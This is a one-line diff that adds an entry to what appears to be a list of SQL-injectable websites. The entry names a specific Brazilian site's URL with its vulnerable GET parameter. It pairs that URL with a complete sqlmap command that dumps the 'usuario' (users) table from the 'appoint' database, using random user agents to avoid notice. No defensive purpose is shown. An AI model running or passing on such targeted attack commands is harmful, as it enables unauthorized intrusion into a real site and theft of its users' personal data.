@@ -1,0 +1,1 @@
+http://www.ciadeprojetos.com.br/projetos.php?tipo_menu=3 (GET)  # sqlmap.py -u http://www.ciadeprojetos.com.br/projetos.php?tipo_menu=3 -D appoint --threads 10 -v3 --random-agent -T usuario --dump
